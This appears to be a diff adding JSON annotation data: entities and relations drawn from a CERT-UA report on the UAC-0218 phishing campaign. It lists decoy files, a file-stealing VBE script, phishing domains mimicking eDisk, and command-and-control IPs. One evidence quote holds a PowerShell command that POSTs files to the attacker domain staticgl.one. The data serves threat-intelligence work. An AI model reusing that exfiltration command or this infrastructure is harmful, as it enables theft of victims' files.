@@ -1,0 +1,191 @@
+{
+  "entities": [
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe."
+    },
+    {
+      "name": "UAC-0218",
+      "kind": "threat group",
+      "gloss": "A threat group tracked by CERT-UA for conducting cyberattacks against Ukrainian targets."
+    },
+    {
+      "name": "eDisk",
+      "kind": "cloud service",
+      "gloss": "A cloud file storage service provided by Ukr.net."
+    },
+    {
+      "name": "Договір20102024.doc",
+      "kind": "decoy document",
+      "gloss": "A password-protected decoy document distributed within malicious RAR archives."
+    },
+    {
+      "name": "Рахунок20102024.xlsx",
+      "kind": "decoy document",
+      "gloss": "A password-protected decoy spreadsheet distributed within malicious RAR archives."
+    },
+    {
+      "name": "Пароль.vbe",
+      "kind": "malicious script",
+      "gloss": "A malicious VBS script designed to search for and exfiltrate user files to a remote server."
+    },
+    {
+      "name": "WEXTRACT.EXE",
+      "kind": "executable file",
+      "gloss": "A standard Windows self-extracting archive utility used to execute PowerShell commands."
+    },
+    {
+      "name": "HostZealot",
+      "kind": "hosting provider",
+      "gloss": "A web hosting and domain registration provider."
+    },
+    {
+      "name": "Python Software Foundation",
+      "kind": "software organization",
+      "gloss": "A non-profit organization dedicated to the development and promotion of the Python programming language."
+    },
+    {
+      "name": "BaseHTTP",
+      "kind": "software component",
+      "gloss": "A basic HTTP server implementation in Python."
+    },
+    {
+      "name": "_№_601.rar",
+      "kind": "malicious archive",
+      "gloss": "A malicious RAR archive distributed via phishing links to deliver scripts and decoy documents."
+    },
+    {
+      "name": "install.txt",
+      "kind": "file",
+      "gloss": "A configuration or directive text file associated with a self-extracting executable."
+    },
+    {
+      "name": "POSTRUNPROGRAM",
+      "kind": "file",
+      "gloss": "A script or directive file executed after unpacking a self-extracting archive."
+    },
+    {
+      "name": "RUNPROGRAM",
+      "kind": "file",
+      "gloss": "A script or directive file executed upon unpacking a self-extracting archive."
+    },
+    {
+      "name": "edisk.ukrnet.01mirror.com.ua",
+      "kind": "internet domain",
+      "gloss": "A malicious subdomain used to host phishing archives impersonating eDisk."
+    },
+    {
+      "name": "ukrnet.01mirror.com.ua",
+      "kind": "internet domain",
+      "gloss": "A malicious subdomain used as part of the attacker's delivery infrastructure."
+    },
+    {
+      "name": "01mirror.com.ua",
+      "kind": "internet domain",
+      "gloss": "A domain used for malicious infrastructure in attacks tracked under UAC-0218."
+    },
+    {
+      "name": "edisk.in.ua",
+      "kind": "internet domain",
+      "gloss": "A malicious domain mimicking the eDisk service to distribute malware."
+    },
+    {
+      "name": "winupmirror.support",
+      "kind": "internet domain",
+      "gloss": "A malicious domain used in the cyberattack infrastructure."
+    },
+    {
+      "name": "staticgl.one",
+      "kind": "internet domain",
+      "gloss": "A domain used as a command-and-control server and data exfiltration receiver."
+    },
+    {
+      "name": "109.205.195.233",
+      "kind": "ip address",
+      "gloss": "An IP address identified as a command-and-control server."
+    },
+    {
+      "name": "194.107.92.234",
+      "kind": "ip address",
+      "gloss": "An IP address identified as an originating address for phishing activity."
+    },
+    {
+      "name": "46.149.173.221",
+      "kind": "ip address",
+      "gloss": "An IP address identified as an originating address for phishing activity."
+    },
+    {
+      "name": "94.140.114.32",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the threat actor's network infrastructure."
+    },
+    {
+      "name": "94.140.114.76",
+      "kind": "ip address",
+      "gloss": "An IP address associated with the threat actor's network infrastructure."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0218",
+      "type": "uses-infrastructure",
+      "tail": "HostZealot",
+      "evidence": "Характерними ознаками управляючої інфраструктури є використанням реєстратора доменних імен HostZealot"
+    },
+    {
+      "head": "_№_601.rar",
+      "type": "contains-file",
+      "tail": "Пароль.vbe",
+      "evidence": "В згаданих архівах знаходилися два захищених паролем документи-приманки... а також VBS-скрипт \"Пароль.vbe\""
+    },
+    {
+      "head": "_№_601.rar",
+      "type": "contains-file",
+      "tail": "Договір20102024.doc",
+      "evidence": "В згаданих архівах знаходилися два захищених паролем документи-приманки (\"Договір20102024.doc\""
+    },
+    {
+      "head": "_№_601.rar",
+      "type": "contains-file",
+      "tail": "Рахунок20102024.xlsx",
+      "evidence": "В згаданих архівах знаходилися два захищених паролем документи-приманки... \"Рахунок20102024.xlsx\""
+    },
+    {
+      "head": "edisk.in.ua",
+      "type": "mimics-service",
+      "tail": "eDisk",
+      "evidence": "посиланням, нібито, на eDisk, для завантаження одноіменних RAR-архівів"
+    },
+    {
+      "head": "edisk.ukrnet.01mirror.com.ua",
+      "type": "mimics-service",
+      "tail": "eDisk",
+      "evidence": "посиланням, нібито, на eDisk, для завантаження одноіменних RAR-архівів"
+    },
+    {
+      "head": "UAC-0218",
+      "type": "uses-domain",
+      "tail": "staticgl.one",
+      "evidence": "iwr https://staticgl.one/$fil -Method POST"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "uses-infrastructure",
+      "definition": "The threat actor or malware relies on services provided by a specific hosting provider, registrar, or infrastructure service."
+    },
+    {
+      "name": "contains-file",
+      "definition": "An archive, container, or package contains a specific file."
+    },
+    {
+      "name": "mimics-service",
+      "definition": "A domain, link, or asset masquerades as a legitimate service or brand."
+    },
+    {
+      "name": "uses-domain",
+      "definition": "A threat actor or tool operates through or communicates with a designated internet domain."
+    }
+  ]
+}
